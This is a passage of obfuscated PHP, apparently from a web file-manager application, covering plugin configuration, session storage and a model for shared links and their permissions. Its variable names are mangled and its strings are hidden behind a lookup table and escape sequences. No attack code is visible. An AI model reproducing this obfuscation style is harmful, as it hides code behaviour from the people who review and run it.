$this->loadList($ˆíïÈÇÏ); if ($÷éÁåúü && is_array($÷éÁåúü[$¿ó›ªÏ—[6]])) { $ŒĞ£˜İ§ = $÷éÁåúü[$¿ó›ªÏ—[6]]; } if (!$ŒĞ£˜İ§ || $Ù…‚¦Ã») { $ŒĞ£˜İ§ = $this->getConfigDefault($ˆíïÈÇÏ); } return $ŒĞ£˜İ§; } public function setConfig($ôÛùÑŒ, $ç¦½Ö÷± = false) { $œÛ´ş¿Ò =& $_SERVER[Ó¡Ÿ§‚]; $Š«ä”–‚ = $this->loadList($ôÛùÑŒ); if (!$Š«ä”–‚) { return !1; } $æã·àŒ± = $Š«ä”–‚[$œÛ´ş¿Ò[6]]; if ($ç¦½Ö÷± == !1) { $æã·àŒ± = array(); $ç¦½Ö÷± = $this->getConfigDefault($ôÛùÑŒ); } foreach ($ç¦½Ö÷± as $Ö÷Œş‹• => $Ó½Ú§ÌÃ) { $æã·àŒ±[$Ö÷Œş‹•] = is_string($Ó½Ú§ÌÃ) ? trim($Ó½Ú§ÌÃ) : $Ó½Ú§ÌÃ; } $this->update($Š«ä”–‚[$œÛ´ş¿Ò[399]], array($œÛ´ş¿Ò[6] => $æã·àŒ±)); } public function viewList() { $æñ¹‡®Ö =& $_SERVER[Ó¡Ÿ§‚]; $Ôİ‚Ÿà = $this->loadList(); $this->pluginScan($Ôİ‚Ÿà); $Ôİ‚Ÿà = $this->loadPluginList(); $‰–°çÉ€ = array(); foreach ($Ôİ‚Ÿà as $÷ñ‰íÂÅ => $Û™ÕÉ±º) { unset($Û™ÕÉ±º[$æñ¹‡®Ö[1975]], $Û™ÕÉ±º[$æñ¹‡®Ö[6]]); $°åİ¯­ş = PLUGIN_DIR . $Û™ÕÉ±º[$æñ¹‡®Ö[32]] . $æñ¹‡®Ö[1977]; if (!is_file($°åİ¯­ş)) { continue; } $Ä‡µÊÁ® = Hook::apply($Û™ÕÉ±º[$æñ¹‡®Ö[32]] . $æñ¹‡®Ö[1985]); if (is_array($Ä‡µÊÁ®)) { $‰–°çÉ€[$÷ñ‰íÂÅ] = array_merge($Û™ÕÉ±º, $Ä‡µÊÁ®); } } return $‰–°çÉ€; } private function loadPluginList() { $êœÉøŞ½ =& $_SERVER[Ó¡Ÿ§‚]; $¡áÙÆ¯– = $this->loadList(); if (strtolower(MOD) == $êœÉøŞ½[1986]) { return $¡áÙÆ¯–; } $È÷ÓİÎø = Hook::trigger($êœÉøŞ½[1987], $¡áÙÆ¯–); if ($¡áÙÆ¯– && !$È÷ÓİÎø) { die; } return $È÷ÓİÎø ? $È÷ÓİÎø : $¡áÙÆ¯–; } private function pluginScan($ÄâÎ€€û) { $‚ĞÀÏ¤õ =& $_SERVER[Ó¡Ÿ§‚]; recursion_dir(PLUGIN_DIR, $§¬ÅæâŠ, $–€Š™¬¯, 0); foreach ($§¬ÅæâŠ as $¨äŒ”‹) { $óè±åƒ‹ = get_path_this($¨äŒ”‹); if (isset($ÄâÎ€€û[$óè±åƒ‹]) || !file_exists($¨äŒ”‹ . $‚ĞÀÏ¤õ[1988]) || !file_exists($¨äŒ”‹ . $‚ĞÀÏ¤õ[1977])) { continue; } Hook::apply($óè±åƒ‹ . $‚ĞÀÏ¤õ[1982]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\x6d\x5f\x73\x65\163\x73\151\x6f\156"; public function get($§†È‡óñ) { $Íİ²ÒÀá =& $_SERVER[Ó¡Ÿ§‚]; $¹©ˆş‹ = $this->where(array($Íİ²ÒÀá[1989] => $§†È‡óñ))->find(); if (!is_array($¹©ˆş‹)) { return !1; } return $¹©ˆş‹[$Íİ²ÒÀá[753]]; } public function set($³àÅ«ì, $ÈÛ‡Èõİ, $Ì¥ûË½µ = 3600) { $³ôë•‚š =& $_SERVER[Ó¡Ÿ§‚]; $í³Ÿ—ı‡ = array($³ôë•‚š[1989] => $³àÅ«ì, $³ôë•‚š[1893] => $ÈÛ‡Èõİ, $³ôë•‚š[1990] => $Ì¥ûË½µ + time()); if (Session::get($³ôë•‚š[1991])) { $í³Ÿ—ı‡[$³ôë•‚š[1665]] = Session::get($³ôë•‚š[1991]); } else { $í³Ÿ—ı‡[$³ôë•‚š[1665]] = 0; } if ($this->get($³àÅ«ì)) { return $this->where(array($³ôë•‚š[1989] => $³àÅ«ì))->save($í³Ÿ—ı‡); } else { return $this->add($í³Ÿ—ı‡, array(), !0); } } public function remove($·İ÷îçù) { return $this->where(array($_SERVER[Ó¡Ÿ§‚][1989] => $·İ÷îçù))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ó¡Ÿ§‚][1992] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\x69\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\x65\x72\164\x2c\x75\x70\x64\141\x74\x65", "\x66\165\x6e\x63\164\x69\157\156"), array("\x63\162\145\141\164\x65\x54\151\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\164", "\x66\x75\x6e\x63\x74\151\x6f\x6e"), array("\x6f\160\x74\151\157\156\163", '', "\151\x6e\x73\145\162\164\x2c\x75\160\144\141\x74\145\54\x73\145\x6c\145\x63\164", "\152\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($«‚àüÂ¢) { $ÙÃ”É =& $_SERVER[Ó¡Ÿ§‚]; $úĞÖæå¡ = isset($«‚àüÂ¢[0]) ? $«‚àüÂ¢[0] : !1; return array($ÙÃ”É[1993] => array(USER_ID, $ÙÃ”É[1994]), $ÙÃ”É[1934] => array($úĞÖæå¡, $ÙÃ”É[1995])); } protected function listSimple() { $„£³äÇÛ = array($_SERVER[Ó¡Ÿ§‚][1665] => USER_ID); $¯ÑâŒ³š = $this->field($this->fieldList)->where($„£³äÇÛ)->select(); return $¯ÑâŒ³š ? $¯ÑâŒ³š : array(); } protected function getInfo($¶ğ›‚ÒŠ, $Ùüíô“æ = false) { $¯Óû¼™ =& $_SERVER[Ó¡Ÿ§‚]; if ($Ùüíô“æ) { return $this->_getShareInfo(array($¯Óû¼™[602] => $¶ğ›‚ÒŠ)); } $Ô©Ù¦ÇŞ = $this->cacheFunctionGet($¯Óû¼™[1936], $¶ğ›‚ÒŠ); return $Ô©Ù¦ÇŞ; } public function getInfoByHash($¯Ã–Ôñ¾) { return $this->_getShareInfo(array($_SERVER[Ó¡Ÿ§‚][1996] => $¯Ã–Ôñ¾)); } public function getInfoByPath($‡™Ò÷êŸ) { $ÒÈ¬´¬¬ =& $_SERVER[Ó¡Ÿ§‚]; $ÜæàÀôÂ = array($ÒÈ¬´¬¬[1665] => USER_ID, $ÒÈ¬´¬¬[411] => $‡™Ò÷êŸ); return $this->_getShareInfo($ÜæàÀôÂ); } public function getInfoBySourcePath($à®¤©¶) { $¥ö¤‡æş =& $_SERVER[Ó¡Ÿ§‚]; $ —à°½ı = array($¥ö¤‡æş[1665] => USER_ID, $¥ö¤‡æş[1174] => $à®¤©¶); return $this->_getShareInfo($ —à°½ı); } private function _getShareInfo($ÚìÛÙñÁ) { $„ƒ–Âş’ =& $_SERVER[Ó¡Ÿ§‚]; $Óé™™ä = $this->where($ÚìÛÙñÁ)->find(); if (!$Óé™™ä) { return !1; } $ÚìÛÙñÁ = array($„ƒ–Âş’[602] => $Óé™™ä[$„ƒ–Âş’[602]]); $¸çÇòæ¯ = $„ƒ–Âş’[1997]; $ëûöÏ¸ = Model($„ƒ–Âş’[603])->order($„ƒ–Âş’[399])->field($¸çÇòæ¯)->where($ÚìÛÙñÁ)->select(); if ($Óé™™ä[$„ƒ–Âş’[411]] == $„ƒ–Âş’[198]) { $Óé™™ä[$„ƒ–Âş’[87]] = IO::info($Óé™™ä[$„ƒ–Âş’[1174]]); } else { $Óé™™ä[$„ƒ–Âş’[87]] = Model($„ƒ–Âş’[1338])->pathInfo($Óé™™ä[$„ƒ–Âş’[411]]); } $Óé™™ä[$„ƒ–Âş’[1998]] = $ëûöÏ¸; return $Óé™™ä; } protected function getInfoAuth($Á÷€ıÌ) { $«ÍË£÷ƒ =& $_SERVER[Ó¡Ÿ§‚]; $œŞû½ƒ‘ = $this->getInfo($Á÷€ıÌ); if ($œŞû½ƒ‘[$«ÍË£÷ƒ[1665]] == USER_ID) { $œŞû½ƒ‘[$«ÍË£÷ƒ[422]] = $œŞû½ƒ‘[$«ÍË£÷ƒ[87]][$«ÍË£÷ƒ[422]]; } else { $œŞû½ƒ‘[$«ÍË£÷ƒ[422]] = Model($«ÍË£÷ƒ[502])->authMake($œŞû½ƒ‘[$«ÍË£÷ƒ[1998]]); } return $œŞû½ƒ‘; } protected function listData($Ğè­œ = null, $¬çÒ÷”¾ = 300) { $Ş÷ÁÛô =& $_SERVER[Ó¡Ÿ§‚]; $“È««Èõ = array(array($Ş÷ÁÛô[497] => array($Ş÷ÁÛô[1011], 0), $Ş÷ÁÛô[600] => array($Ş÷ÁÛô[1011], 0), $Ş÷ÁÛô[1999] => $Ş÷ÁÛô[1952])); if ($Ğè­œ == $Ş÷ÁÛô[2000]) { $“È««Èõ = array($Ş÷ÁÛô[497] => 1); } else { if ($Ğè­œ == $Ş÷ÁÛô[1160]) { $“È««Èõ = array($Ş÷ÁÛô[600] => 1); } } $“È««Èõ[$Ş÷ÁÛô[1665]] = USER_ID; $–±šŸ£ = $this->where($“È««Èõ)->selectPage($¬çÒ÷”¾); return $–±šŸ£; } protected function listToMe($¾¾ÊÌ¼Ê = 300) { $Ğûˆğø =& $_SERVER[Ó¡Ÿ§‚]; $—’úÛˆ¸ = Model($Ğûˆğø[2001])->userGroupParents(USER_ID); $–§ú¶¡î = array($Ğûˆğø[585] => SourceModel::TYPE_USER, $Ğûˆğø[505] => USER_ID); if ($—’úÛˆ¸) { $–§ú¶¡î = array(array($Ğûˆğø[585] => SourceModel::TYPE_USER, $Ğûˆğø[505] => USER_ID), array($Ğûˆğø[585] => SourceModel::TYPE_GROUP, $Ğûˆğø[505] => array($Ğûˆğø[7], $—’úÛˆ¸)), $Ğûˆğø[1999] => $Ğûˆğø[1952]); } $âË¦¡àÅ = Model($Ğûˆğø[603])->where($–§ú¶¡î)->selectPage($¾¾ÊÌ¼Ê); $ÀÌºÛÜÁ = array_to_keyvalue_group($âË¦¡àÅ[$Ğûˆğø[369]], $Ğûˆğø[602]); if (!$ÀÌºÛÜÁ) { return $âË¦¡àÅ; } $”’®Ô¢¾ = $Ğûˆğø[2002]; $–§ú¶¡î = array($Ğûˆğø[602] => array($Ğûˆğø[427], array_keys($ÀÌºÛÜÁ)), $Ğûˆğø[1665] => array($Ğûˆğø[1013], $Ğûˆğø[198])); $§¯ô®˜µ = $this->field($”’®Ô¢¾)->where($–§ú¶¡î)->select(); foreach ($§¯ô®˜µ as $²¶ØçÅÜ => &$ç÷»³±‘) { $ç÷»³±‘[$Ğûˆğø[1998]] = $ÀÌºÛÜÁ[$ç÷»³±‘[$Ğûˆğø[602]]]; } unset($ç÷»³±‘); $îŒâŸ  = array($Ğûˆğø[2003] => $§¯ô®˜µ, $Ğûˆğø[2004] => $âË¦¡àÅ[$Ğûˆğø[366]]); return $îŒâŸ ; } protected function shareAdd($È÷‚¾Ìö, $”‡Òç÷¢) { $Çô¦¾á =& $_SERVER[Ó¡Ÿ§‚]; $úÖÅ¨÷’ = $this->_addShareData($È÷‚¾Ìö, $”‡Òç÷¢); if (!empty($”‡Òç÷¢[$Çô¦¾á[2005]])) { $this->_shareAuthSet($úÖÅ¨÷’, $”‡Òç÷¢[$Çô¦¾á[2005]]); } $this->shareEventAdd($È÷‚¾Ìö, $”‡Òç÷¢, $Çô¦¾á[2006]); return $úÖÅ¨÷’; } protected function shareAddSystem($•¸ûüşæ, $òêéÏ™) { $ˆ·á×ÊĞ =& $_SERVER[Ó¡Ÿ§‚]; $•›Úğ“ = $this->_addShareData($•¸ûüşæ, $òêéÏ™, $ˆ·á×ÊĞ[1283]); $this->_shareAuthSet($•›Úğ“, $òêéÏ™[$ˆ·á×ÊĞ[2005]]); return $•›Úğ“; } private function shareEventAdd($½ò•ôÂù, $”úò•½¦, $î×¾ÅŸ° = "\x61\x64\x64") { $‚ÈÕŒìÌ =& $_SERVER[Ó¡Ÿ§‚]; if (!$½ò•ôÂù || $½ò•ôÂù == $‚ÈÕŒìÌ[198]) { return; } if ($î×¾ÅŸ° == $‚ÈÕŒìÌ[2006]) { if ($”úò•½¦[$‚ÈÕŒìÌ[497]] == $‚ÈÕŒìÌ[88]) { Model($‚ÈÕŒìÌ[570])->eventShare($½ò•ôÂù, $‚ÈÕŒìÌ[2007]); } if ($”úò•½¦[$‚ÈÕŒìÌ[600]] == $‚ÈÕŒìÌ[88]) { Model($‚ÈÕŒìÌ[570])->eventShare($½ò•ôÂù, $‚ÈÕŒìÌ[2008]); } return; } $¸š “¾” = $this->getInfoByPath($½ò•ôÂù); $Ôõ¸Ø = $‚ÈÕŒìÌ[2009]; if ($¸š “¾”[$‚ÈÕŒìÌ[497]] == $‚ÈÕŒìÌ[198] && $”úò•½¦[$‚ÈÕŒìÌ[497]] == $‚ÈÕŒìÌ[88]) { $Ôõ¸Ø = $‚ÈÕŒìÌ[2007]; } if ($¸š “¾”[$‚ÈÕŒìÌ[497]] == $‚ÈÕŒìÌ[88] && $”úò•½¦[$‚ÈÕŒìÌ[497]] == $‚ÈÕŒìÌ[198]) { $Ôõ¸Ø = $‚ÈÕŒìÌ[2010]; } if ($¸š “¾”[$‚ÈÕŒìÌ[600]] == $‚ÈÕŒìÌ[198] && $”úò•½¦[$‚ÈÕŒìÌ[600]] == $‚ÈÕŒìÌ[88]) { $Ôõ¸Ø = $‚ÈÕŒìÌ[2008]; } if ($¸š “¾”[$‚ÈÕŒìÌ[600]] == $‚ÈÕŒìÌ[88] && $”úò•½¦[$‚ÈÕŒìÌ[600]] == $‚ÈÕŒìÌ[198]) { $Ôõ¸Ø = $‚ÈÕŒìÌ[2011]; } Model($‚ÈÕŒìÌ[570])->eventShare($½ò•ôÂù, $Ôõ¸Ø); return; } private function _addShareData($±‘ËÒ¶Á, $ÊÖìÔª— = array(), $›×ãŠ©© = false) { $ğÅ—çÒˆ =& $_SERVER[Ó¡Ÿ§‚]; $Æƒåé¤Ğ = $›×ãŠ©© == $ğÅ—çÒˆ[1283] ? 0 : USER_ID; $í¿Ñ†Îâ = array($ğÅ—çÒˆ[426] => $±‘ËÒ¶Á, $ğÅ—çÒˆ[1656] => $Æƒåé¤Ğ); if ($±‘ËÒ¶Á == 0) { $í¿Ñ†Îâ = array($ğÅ—çÒˆ[2012] => $ÊÖìÔª—[$ğÅ—çÒˆ[1174]], $ğÅ—çÒˆ[1656] => $Æƒåé¤Ğ); } if ($âÏÇÒâ = $this->where($í¿Ñ†Îâ)->find()) { return $âÏÇÒâ[$ğÅ—çÒˆ[602]]; } if ($±‘ËÒ¶Á == 0) { $™Œù¥íŸ = array($ğÅ—çÒˆ[32] => get_path_this($ÊÖìÔª—[$ğÅ—çÒˆ[84]])); } else { $™Œù¥íŸ = Model($ğÅ—çÒˆ[824])->sourceInfo($±‘ËÒ¶Á); if (!$™Œù¥íŸ) { return !1; } } if (!$ÊÖìÔª—[$ğÅ—çÒˆ[1565]]) { $ÊÖìÔª—[$ğÅ—çÒˆ[1565]] = $™Œù¥íŸ[$ğÅ—çÒˆ[32]]; } $óæÄèÒ” = array($ğÅ—çÒˆ[1656] => $Æƒåé¤Ğ, $ğÅ—çÒˆ[426] => $±‘ËÒ¶Á, $ğÅ—çÒˆ[1565] => $ğÅ—çÒˆ[12], $ğÅ—çÒˆ[497] => 0, $ğÅ—çÒˆ[600] => 0, $ğÅ—çÒˆ[1174] => $ğÅ—çÒˆ[12], $ğÅ—çÒˆ[307] => $ğÅ—çÒˆ[12], $ğÅ—çÒˆ[888] => $ğÅ—çÒˆ[12], $ğÅ—çÒˆ[2013] => 0, $ğÅ—çÒˆ[2014] => 0, $ğÅ—çÒˆ[760] => 0, $ğÅ—çÒˆ[2015] => $ğÅ—çÒˆ[12], $ğÅ—çÒˆ[1996] => $ğÅ—çÒˆ[12]); $Å­†÷µ¯ = explode($ğÅ—çÒˆ[50], $ğÅ—çÒˆ[2016]); foreach ($Å­†÷µ¯ as $˜Úß“‚ƒ) { if (!isset($ÊÖìÔª—[$˜Úß“‚ƒ])) { continue; } $óæÄèÒ”[$˜Úß“‚ƒ] = $ÊÖìÔª—[$˜Úß“‚ƒ]; } $£™œ„ç = $this->add($óæÄèÒ”); $Œ›­Æã¿ = array($ğÅ—çÒˆ[1996] => short_id($£™œ„ç)); $this->where(array($ğÅ—çÒˆ[2017] => $£™œ„ç))->save($Œ›­Æã¿); return $£™œ„ç; } private function _shareAuthSet($ú’ŞÀ”Ô, $ŞÑÜ¤‡’) { $§¥’”Äã =& $_SERVER[Ó¡Ÿ§‚]; if (!is_array($ŞÑÜ¤‡’)) { return !1; } $ç ·í = Model($§¥’”Äã[1962]); $ç ·í->where(array($§¥’”Äã[602] => $ú’ŞÀ”Ô))->delete(); $›ë—Şôû = array(); foreach ($ŞÑÜ¤‡’ as $ßÉ¥€) { $±¦–Í¡ı = SourceModel::TYPE_USER; if ($ßÉ¥€[$§¥’”Äã[420]] == SourceModel::TYPE_GROUP) { $±¦–Í¡ı = SourceModel::TYPE_GROUP; } $¶°ã¾Şø = array($§¥’”Äã[602] => $ú’ŞÀ”Ô, $§¥’”Äã[420] => $±¦–Í¡ı, $§¥’”Äã[505] => intval($ßÉ¥€[$§¥’”Äã[505]]), $§¥’”Äã[1958] => 0, $§¥’”Äã[2018] => -1); if ($ßÉ¥€[$§¥’”Äã[1958]]) { $¶°ã¾Şø[$§¥’”Äã[1958]] = $ßÉ¥€[$§¥’”Äã[1958]]; } else { if ($ßÉ¥€[$§¥’”Äã[2018]]) { $¶°ã¾Şø[$§¥’”Äã[2018]] = $ßÉ¥€[$§¥’”Äã[2018]]; } } $›ë—Şôû[] = $¶°ã¾Şø; } return $ç ·í->addAll($›ë—Şôû, array(), !0); } public function numViewAdd($¹é°Ì¿½) { $¦´ÙÃ ‹ =& $_SERVER[Ó¡Ÿ§‚]; $Ãñ§Û¬ = array($¦´ÙÃ ‹[2017] => $¹é°Ì¿½); $this->where($Ãñ§Û¬)->setAdd($¦´ÙÃ ‹[2013]); } public function numDownloadAdd($‚íÁš–¿) { $„Šèˆš£ =& $_SERVER[Ó¡Ÿ§‚]; $Ğ•ËÄ – = array($„Šèˆš£[2017] => $‚íÁš–¿); $this->where($Ğ•ËÄ –)->setAdd($„Šèˆš£[2014]); } protected function shareEdit($íïÙ¦Ú¦, $Ä€˜¶ğ©) { $ì˜ã€ïš =& $_SERVER[Ó¡Ÿ§‚]; $×»¼ŸÑÓ = $this->getInfo($íïÙ¦Ú¦); if (!$×»¼ŸÑÓ) { return !1; } $this->_checkLinkShare($Ä€˜¶ğ©, $×»¼ŸÑÓ); $´Íİùå‘ = array(); $‡ì¦¡€ = explode($ì˜ã€ïš[50], $ì˜ã€ïš[2019]); foreach ($‡ì¦¡€ as $ÇÆ³Ä ) { if (!array_key_exists($ÇÆ³Ä , $Ä€˜¶ğ©)) { continue; } $´Íİùå‘[$ÇÆ³Ä ] = $Ä€˜¶ğ©[$ÇÆ³Ä ]; } $this->shareEventAdd($×»¼ŸÑÓ[$ì˜ã€ïš[411]], $Ä€˜¶ğ©, $ì˜ã€ïš[1824]); $this->where(array($ì˜ã€ïš[2017] => $íïÙ¦Ú¦))->save($´Íİùå‘); if (isset($Ä€˜¶ğ©[$ì˜ã€ïš[2005]])) { $this->_shareAuthSet($íïÙ¦Ú¦, $Ä€˜¶ğ©[$ì˜ã€ïš[2005]]); } return !0; } private function _checkLinkShare($µØ¬×°ï, $ÉÆÈğ§ë) { $Ü³œõãü =& $_SERVER[Ó¡Ÿ§‚]; if ($µØ¬×°ï[$Ü³œõãü[497]] != $Ü³œõãü[88]) { return; } $ü³µ¬Ï = $ÉÆÈğ§ë[$Ü³œõãü[87]][$Ü³œõãü[411]]; if ($ÉÆÈğ§ë[$Ü³œõãü[87]][$Ü³œõãü[33]] != $Ü³œõãü[200]) { $¬Ö›’£ = $this->_folderReport($ü³µ¬Ï); if (!$¬Ö›’£) { return; } show_json(LNG($Ü³œõãü[2020]) . $Ü³œõãü[2021] . $¬Ö›’£, !1); } $•Ô£¡«å = Model($Ü³œõãü[824])->fileInfoGet($ÉÆÈğ§ë[$Ü³œõãü[87]][$Ü³œõãü[411]]); if (!$•Ô£¡«å) { return; } $í†Œ¤ŞÌ = $this->shareFileMeta($•Ô£¡«å[$Ü³œõãü[477]]); if (isset($í†Œ¤ŞÌ[$Ü³œõãü[374]]) && $í†Œ¤ŞÌ[$Ü³œõãü[374]] == $Ü³œõãü[88]) { show_json(LNG($Ü³œõãü[2022]), !1); } } private function _folderReport($›úªáˆ) { $Ş¿şŠÄ¢ =& $_SERVER[Ó¡Ÿ§‚]; $öÈ÷ÉĞ¼ = array($Ş¿şŠÄ¢[477] => array($Ş¿şŠÄ¢[1011], 0), $Ş¿şŠÄ¢[748] => 3); $»³ğÑ¥õ = Model($Ş¿şŠÄ¢[2023])->where($öÈ÷ÉĞ¼)->field($Ş¿şŠÄ¢[477])->select(); if (!$»³ğÑ¥õ) { return !1; } $»³ğÑ¥õ = array_to_keyvalue($»³ğÑ¥õ, $Ş¿şŠÄ¢[12], $Ş¿şŠÄ¢[477]); $“Ñœ¥˜÷ = $Ş¿şŠÄ¢[50] . $›úªáˆ . $Ş¿şŠÄ¢[50]; $öÈ÷ÉĞ¼ = array($Ş¿şŠÄ¢[477] => array($Ş¿şŠÄ¢[7], $»³ğÑ¥õ), $Ş¿şŠÄ¢[520] => array($Ş¿şŠÄ¢[383], "\x25{$“Ñœ¥˜÷}\x25"), $Ş¿şŠÄ¢[440] => 0); $ëÏÔŸÛÄ = Model($Ş¿şŠÄ¢[824])->where($öÈ÷ÉĞ¼)->field($Ş¿şŠÄ¢[2024])->find(); if (!$ëÏÔŸÛÄ) { return !1; } $“Ğ„šãÉ = substr($ëÏÔŸÛÄ[$Ş¿şŠÄ¢[520]], strpos($ëÏÔŸÛÄ[$Ş¿şŠÄ¢[520]], $“Ñœ¥˜÷)); $öÈ÷ÉĞ¼ = array($Ş¿şŠÄ¢[411] => array($Ş¿şŠÄ¢[7], trim($“Ğ„šãÉ, $Ş¿şŠÄ¢[50]))); $øÁš‘†Ü = Model($Ş¿şŠÄ¢[824])->where($öÈ÷ÉĞ¼)->field($Ş¿şŠÄ¢[32])->select(); $É¡­•²á = array_to_keyvalue($øÁš‘†Ü, $Ş¿şŠÄ¢[12], $Ş¿şŠÄ¢[32]); $É¡­•²á[] = $ëÏÔŸÛÄ[$Ş¿şŠÄ¢[32]]; return implode($Ş¿şŠÄ¢[8], $É¡­•²á); } protected function remove($ãšò¥¼ç) { $ÔĞÀ‹Ø =& $_SERVER[Ó¡Ÿ§‚]; if (is_array($ãšò¥¼ç)) { $ãšò¥¼ç = array($ÔĞÀ‹Ø[7], $ãšò¥¼ç); } $Íæ«ÅÛñ = array($ÔĞÀ‹Ø[602] => $ãšò¥¼ç); $‰¯ó°©˜ = $this->where($Íæ«ÅÛñ)->delete(); if ($‰¯ó°©˜) { Model($ÔĞÀ‹Ø[603])->where(array($ÔĞÀ‹Ø[602] => $ãšò¥¼ç))->delete(); } $Äâšøş = is_array($ãšò¥¼ç) ? $ãšò¥¼ç[1] : array($ãšò¥¼ç); for ($¥Èï¡˜Ã = 0; $¥Èï¡˜Ã < count($Äâšøş); $¥Èï¡˜Ã++) { $Ûıó“´¿ = $this->getInfo($Äâšøş[$¥Èï¡˜Ã]); if ($Ûıó“´¿[$ÔĞÀ‹Ø[600]] == $ÔĞÀ‹Ø[88]) { Model($ÔĞÀ‹Ø[570])->eventShare($Ûıó“´¿[$ÔĞÀ‹Ø[411]], $ÔĞÀ‹Ø[2011]); } if ($Ûıó“´¿[$ÔĞÀ‹Ø[497]] == $ÔĞÀ‹Ø[88]) { Model($ÔĞÀ‹Ø[570])->eventShare($Ûıó“´¿[$ÔĞÀ‹Ø[411]], $ÔĞÀ‹Ø[2010]); } } return $‰¯ó°©˜; } protected function removeBySource($¨Š›¾Ëâ) { $·šğ¡ï² =& $_SERVER[Ó¡Ÿ§‚]; $Üéè–ÕÙ = array($·šğ¡ï²[426] => array($·šğ¡ï²[427], $¨Š›¾Ëâ)); $ë£òÎË = $this->field($·šğ¡ï²[602])->where($Üéè–ÕÙ)->select(); $ë£òÎË = array_to_keyvalue($ë£òÎË, $·šğ¡ï²[12], $·šğ¡ï²[602]); if (!$ë£òÎË) { return; } $Üéè–ÕÙ = array($·šğ¡ï²[2017] => array($·šğ¡ï²[427], $ë£òÎË)); $this->where($Üéè–ÕÙ)->delete(); Model($·šğ¡ï²[603])->where($Üéè–ÕÙ)->delete(); } public function listAll($¾ùô…¾ô) { $±½ûûœ =& $_SERVER[Ó¡Ÿ§‚]; $ê¯‰ÄÂÛ = array(); if ($¾ùô…¾ô[$±½ûûœ[1665]]) { $ê¯‰ÄÂÛ[$±½ûûœ[1665]] = $¾ùô…¾ô[$±½ûûœ[1665]]; } if ($¾ùô…¾ô[$±½ûûœ[759]]) { $°‘Ş¿Ç = $¾ùô…¾ô[$±½ûûœ[760]] ? $¾ùô…¾ô[$±½ûûœ[760]] : strtotime(date($±½ûûœ[2025])); $ê¯‰ÄÂÛ[$±½ûûœ[201]] = array($±½ûûœ[333], array($¾ùô…¾ô[$±½ûûœ[759]], $°‘Ş¿Ç)); } if ($¾ùô…¾ô[$±½ûûœ[33]]) { $ê¯‰ÄÂÛ[$¾ùô…¾ô[$±½ûûœ[33]]] = 1; } else { $ê¯‰ÄÂÛ[] = array($±½ûûœ[497] => array($±½ûûœ[1011], 0), $±½ûûœ[600] => array($±½ûûœ[1011], 0), $±½ûûœ[1999] => $±½ûûœ[1952]); } if ($¾ùô…¾ô[$±½ûûœ[1948]]) { $ê¯‰ÄÂÛ[] = array($±½ûûœ[1996] => $¾ùô…¾ô[$±½ûûœ[1948]], $±½ûûœ[1565] => array($±½ûûœ[383], "\45{$¾ùô…¾ô[$±½ûûœ[1948]]}\x25"), $±½ûûœ[1999] => $±½ûûœ[1952]); } $–Óğ®­Û = $this->_makeOrder()->where($ê¯‰ÄÂÛ)->selectPage(20); if (empty($–Óğ®­Û[$±½ûûœ[369]])) { return array(); } $this->_listDataApply($–Óğ®­Û[$±½ûûœ[369]]); return $–Óğ®­Û; } public function listDataApply($ûãâûÒÙ) { $this->_listDataApply($ûãâûÒÙ); return $ûãâûÒÙ; } private function _listDataApply(&$ú‚ñ’ê“) { $ßÍ–øŸè =& $_SERVER[Ó¡Ÿ§‚]; $†ÕšÛÉó = array_to_keyvalue($ú‚ñ’ê“, $ßÍ–øŸè[12], $ßÍ–øŸè[1665]); $ƒ¢Áì¼ø = Model($ßÍ–øŸè[534])->userListInfo(array_unique($†ÕšÛÉó)); $çù¾ìƒÑ = array_to_keyvalue($ú‚ñ’ê“, $ßÍ–øŸè[12], $ßÍ–øŸè[411]); $£Ø™µå´ = Model($ßÍ–øŸè[824])->sourceListInfo($çù¾ìƒÑ, !0); foreach ($ú‚ñ’ê“ as $øÉØŞåû => &$â÷òÙ‰´) { $ç¹¤Ğ÷Œ = $â÷òÙ‰´[$ßÍ–øŸè[1665]]; $â÷òÙ‰´[$ßÍ–øŸè[2026]] = $ƒ¢Áì¼ø[$ç¹¤Ğ÷Œ] ? $ƒ¢Áì¼ø[$ç¹¤Ğ÷Œ] : !1; $‘´òúÃĞ = $â÷òÙ‰´[$ßÍ–øŸè[411]]; $â÷òÙ‰´[$ßÍ–øŸè[87]] = $£Ø™µå´[$‘´òúÃĞ] ? $£Ø™µå´[$‘´òúÃĞ] : !1; if ($â÷òÙ‰´[$ßÍ–øŸè[87]][$ßÍ–øŸè[440]] == $ßÍ–øŸè[88]) { unset($ú‚ñ’ê“[$øÉØŞåû]); } if ($â÷òÙ‰´[$ßÍ–øŸè[87]] != $ßÍ–øŸè[198] && !$â÷òÙ‰´[$ßÍ–øŸè[87]]) { unset($ú‚ñ’ê“[$øÉØŞåû]); } } unset($â÷òÙ‰´); $ú‚ñ’ê“ = array_values($ú‚ñ’ê“); } private function _makeOrder($¯•à÷åã = '') { $ó©ÇÕâó =& $_SERVER[Ó¡Ÿ§‚]; $æÊá‰œ„ = array($ó©ÇÕâó[201], $ó©ÇÕâó[760], $ó©ÇÕâó[2013], $ó©ÇÕâó[2014]); $æÖşÓø« = array($ó©ÇÕâó[459] => $ó©ÇÕâó[460], $ó©ÇÕâó[461] => $ó©ÇÕâó[462]); $Ñ–Ş×Å· = Input::get($ó©ÇÕâó[466], $ó©ÇÕâó[7], $ó©ÇÕâó[432], $æÊá‰œ„); $ĞêÅÕ°’ = Input::get($ó©ÇÕâó[467], $ó©ÇÕâó[7], $ó©ÇÕâó[2027], array($ó©ÇÕâó[1945], $ó©ÇÕâó[461])); $ĞêÅÕ°’ = $æÖşÓø«[$ĞêÅÕ°’]; $¯•à÷åã = $¯•à÷åã . "{$Ñ–Ş×Å·}\x20{$ĞêÅÕ°’}"; return $this->order($¯•à÷åã); } public function reportAdd($•îÛ°Ïï) { $ÔÄá¤¯ =& $_SERVER[Ó¡Ÿ§‚]; $û•Ç¨˜ = array($ÔÄá¤¯[602] => $•îÛ°Ïï[$ÔÄá¤¯[602]], $ÔÄá¤¯[1665] => USER_ID); if (Model($ÔÄá¤¯[2023])->where($û•Ç¨˜)->find()) { return !1; } $×ç§ğÈË = array($ÔÄá¤¯[602] => $•îÛ°Ïï[$ÔÄá¤¯[602]], $ÔÄá¤¯[1565] 